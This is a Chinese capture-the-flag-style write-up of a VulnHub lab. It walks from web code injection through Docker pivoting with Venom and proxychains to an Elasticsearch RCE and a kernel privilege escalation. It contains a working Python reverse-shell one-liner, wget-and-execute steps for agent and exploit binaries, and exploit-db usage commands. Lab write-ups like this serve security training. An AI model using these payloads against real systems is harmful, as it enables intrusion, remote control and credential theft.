# 原创
：  从WEB到docker逃逸到内网横向，打靶经验分享。

# 从WEB到docker逃逸到内网横向，打靶经验分享。

### 从web到内网到横向提权，一气呵成完成完美的内网渗透

今天用kali来打一个难度挺高的靶场，靶场包括了多种渗透测试方法：<br/> 1.端口扫描2.目录扫描3.代码注入4.shell 脚本5.内网穿透6.内核提权7.密码破解 打完后给我的最大收获就是信息收集的重要性，没有好的信息收集过程，这个靶场还是很有难度的。最后还是因为版本的问题有点小瑕疵，但也大差不差。从web到内网横向，希望大家看完能够有所收获

靶机下载地址：https://www.vulnhub.com/entry/boredhackerblog-social-network,454/

### 靶机搭建

直接下载目标靶机，用Virtualbox搭建镜像，vmware也可以，但网上有的说法是vulnhub的靶场在vmware运行会有bug，当然我现在也是没有发现哈。搭建成功后就是如下场景。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d0e0daa3467e48eb8142020cf8fb6d5d.png"/>

### 信息收集

1.寻找靶机IP<br/> 使用ifconfig查看本机的内网IP网段。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/05d038b0b65140808e6741cbeeff759a.png"/><br/> 使用nmap寻找靶机的IP<br/> `nmap 192.168.126.0/24`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ed5eecdf51f44f6ab15fce41e8fd8511.png"/><br/> nmap深度探测一下，发现靶机是ubuntu，而且目标系统是python写的。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a0399008275a4368982e0880a819b28d.png"/>

根据开启的端口探测到存活的靶机为192.168.126.185,发现开启了5000端口。访问一下：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/609c1575ea1d463aaa7c2698ae02d0ac.png"/><br/> 看一下页面功能，如同靶机名称，是一个社交网络，非常简单的一个聊天室。用xss和注入等简单测试一下，发现页面没有漏洞。继续进行信息收集。接下来可以用dirsearch扫一下目录。<br/> `dirsearch -u http://192.168.126.185:5000/`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/384a13794b3d4486a611a8483301d6af.png"/><br/> 扫出来了admin子目录，访问一下。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d360a5c2b8a1433986ffbf0e984d75e7.png"/><br/> 是一个输入框。而且Nothing was ran. Input some code to exec()，提示我们这里可以执行代码，但是经过我测试发现没有回显。只能在这里反弹一下shell了。因为前面发现是py写的，我们直接写入python的反弹shell

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.126.130",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

```

使用nc监听一下：`nc -lvvp 1234`<br/> 直接将shell放入输入框执行。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/34c38bc884c44653a088b94bbce7281e.png"/><br/> 也是成功拿了shell，但竟然直接就是root权限，很是不解，难道这就结束了？ls发现有一个dockerfile文件，是不是这个环境是docker容器，接着往下验证，发现存在docker环境配置文件。答案呼之欲出了，现在的环境就是docker环境。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/5ba2385bff624c0fb7262b4911fdd210.png"/><br/> 现在，已经拿到了docker容器的权限，接下来要从docker逃逸出来。继续进行docker内的信息收集。继续ifconfig<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ba56426bb8f74e668b20b94c3213b27d.png"/><br/> 发现了docker容器的IP为172.17.0.3,并且是16位掩码,就是存在65535台主机。docker中是没有arp-scan这样的工具的，扫网段只能写一段shell脚本。使用for循环的思路ping出网段。先扫前10台，shell如下：

```
for i in $(seq 1 10); do ping -c 1 172.17.0.$i; done

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6e8e5eb72a434f00b0c86b1901221301.png"/><br/> 发现前三台主机都是存活的。172.17.0.3是当前容器的内网IP。现在需要与内网进行交互，只能内网穿透了。我们使用venom来进行穿透，下载链接（注意火绒会对此工具报毒）：<br/> [https://github.com/Dliv3/Venom/releases/download/v1.1.0/Venom.v1.1.0.7z](https://github.com/Dliv3/Venom/releases/download/v1.1.0/Venom.v1.1.0.7z)<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/79ccce0328234e7da1aec57b032b05de.png"/><br/> 在这个文件夹打开终端，运行服务端：<br/> `./admin_linux_x64 -lport 9999`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c9613e852b7d4555a88fdb426746e183.png"/><br/> 再打开另一个终端，继续来到该工具目录下，挂载文件到8000端口。<br/> `python3 -m http.server 8000`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/51dea8a72ffa48aaa657e3755aeb6550.png"/><br/> 现在要在目标服务端下载agent_linux_x64。<br/> `wget http://192.168.126.130:8000/agent_linux_x64`<br/> 然后给目标文件执行权限：<br/> `chmod +x agent_linux_x64`<br/> 最后链接客户端：<br/> `./agent_linux_x64 -rhost 192.168.126.130 -rport 9999`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0e5a036423e0423bb9a7ff6d61a59b28.png"/><br/> 这样，192.168.126.185这台主机就成为我们的代理节点了，在Venom控制台输入以下命令：

```
show 查看服务端
goto 1 进入节点
socks 1080 启动一个socks监听

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/716c2385a3f44223ad29aa2cd5401954.png"/><br/> 现在给kali机挂上代理，通过1080端口将服务器作为代理<br/> sudo vi /etc/proxychains4.conf拉倒最下面，最下面将`socks4 127.0.0.1 9050`改为`socks5 127.0.0.1 1080`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b3d86993107a4477b7d8c7603218747e.png"/>

现在就可以使用我们的kali对目标内网进行渗透了。

### 内网渗透

对刚刚发现的172.17.0.1/2两台存活的主机进行扫描，通过proxychains对这两台机器进行渗透：<br/> `proxychains nmap -Pn -sT 172.17.0.1`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b3be81bf3aca46b7be367a84db39358f.png"/><br/> 发现这个0.1开的22和5000和前面的192.168.126.185的端口一模一样，我就想这是不是就是他的内网地址。浏览器挂代理，访问一下试试。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2eea583bbaaa4c29b53b13d597ad4b15.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/e2edd3355f0b44faa417977bd01cce6e.png"/><br/> 一模一样，所以172.17.0.1就是那台服务器。<br/> 还有一台172.17.0.2，我们试试看他能干什么。继续nmap。<br/> `proxychains nmap -Pn -sT 172.17.0.2`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1706a9b93c2c44aca94d6f82d21c780f.png"/><br/> 发现开着一个9200端口，这个端口是ElasticSearch-Head等工具连接ElasticSearch使用的一个http协议。而且，存在着漏洞！

### 发起进攻

搜索一下exp：`searchsploit Elasticsearch`，发现有两个rce。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/16eeb46891f948fa81ff0c13a7528fe2.png"/><br/> 创建一个exp文件夹，复制到当前目录下：<br/> `cp /usr/share/exploitdb/exploits/linux/remote/36337.py exp`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/66abc28e990a41b0b49dd657e03eb309.png"/><br/> `vim 36337.py`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7f2b13ab39ef4fc7bada62e40949b5a4.png"/><br/> 是Python2写的，可以看到用法。<br/> `python2 36337.py`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/fb2d6d588170423cbd869f0b120fe2e2.png"/><br/> 注意：这里不能直接使用exp，吸取了各位前辈们的教训后，这里要先让Elasticsearch这个服务存在数据，才能成功命中。<br/> 解决办法，先给一条数据给它<br/> `proxychains curl -XPOST '172.17.0.2:9200/twittter/user/yren' -d '{"name":"tuboshu"}'`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8a8f24ed9dea42d08f1287f5843d3023.png"/>

直接开打：<br/> `proxychains python2 36337.py 172.17.0.2`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ade136924fd249e680cfea53e073a187.png"/><br/> 拿到shell，发现还是root权限，在目录下发现了passwords，查看看一下<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/486e13db6c9c4be0b248b1ce429ebb9e.png"/><br/> 可以看到对应的账户名和密码hash值。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/00b575efa3a445aa9e9c9b40e17c2a45.png"/><br/> 解密后发现john的密码为1337hack，而且经过测试只有john能登录。

### 提权

现在，用ssh登录john的账号。<br/> `ssh john@192.168.126.185`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/bbe1f1deda78497596fcaf91d84819a2.png"/><br/> 系统目标使用3.13的内核。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/762179aaf4f74a41a4dbc8c53a8cea2d.png"/><br/> 搜索该内核对应的提权方式（这里直接点了个能用的，真实渗透都需要试试）：<br/> `searchsploit linux 3.13`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/07a8eb35ed1e4a6ba35bcbf72bbf5161.png"/><br/> `cp /usr/share/exploitdb/exploits/linux/local/37292.c exp`<br/> `vim 37292.c`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a6149ef38f1d45c98399d6952490b241.png"/><br/> 是c语言，要使用gcc编译。<br/> exp一般都是本地编译完成后上传到靶机上。但这个exp有一个很特别的地方，在第143行：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6c87e97c44ec41eca69b5f2e557f07d3.png"/><br/> 它调用了gcc执行，但目标靶机肯定是没有gcc的，exp就没有用了。我们可以修改它的源码，将这段需要用到gcc编译库文件的代码删除。修改后：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/165a9ca3938840acab7b13b05ee98ca5.png"/>

对修改后的exp进行编译：<br/> `gcc -o exp 37292.c`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8b1431cfb7f540a38d949e70c0f72823.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4566107531ad432dba4932776d4162c8.png"/><br/> 要执行还要配合ofs-lib.so这个文件<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/bd7e0d7ae3394be5b931c74dc5b32661.png"/><br/> 拷贝过来：<br/> `cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so exp`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f0e24da015e0420aa336c35f0e8e208b.png"/><br/> 挂载到8000端口上。<br/> `python3 -m http.server 80`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f4b931f15d9a4be0965672f2149b87b6.png"/><br/> 下载：<br/> `wget http://192.168.126.130/exp`<br/> `wget http://192.168.126.130/ofs-lib.so`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/42107a7c74ae48d1bc7887cd7171f1e4.png"/><br/> 移动到tmp下，然后给执行权限，然后执行：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a37cd5054e0748b7b5371af6964bd58c.png"/><br/> 我这里报错是因为gcc版本问题，解决的话相当麻烦，如果你们也遇到了这种情况，直接用18年的kali就不会出这样的错误。正常的话已经提权成功。拿下该主机。<br/> 打靶完成。

### 总结

1.寻找靶机IP：192.168.126.185<br/> 2.nmap端口搜集：5000,22<br/> 3.应用扫描web，openssh<br/> 4.web服务访问，测试没有漏洞<br/> 5.dirsearch扫描到目录，/admin<br/> 6.远程rce，反弹shell，拿到root权限<br/> 7.发现处于docker容器，内网存活主机探测<br/> 8.内网穿透，venom使用<br/> 9.存活主机全端口扫描，确认172.17.0.1为sudo机器，在172.17.0.2发现9200端口，搜索利用exp远程rce，拿下elasticsearch机器的root权限<br/> 10.password文件发现密码，解密，ssh登陆sudo机，内核漏洞提权。
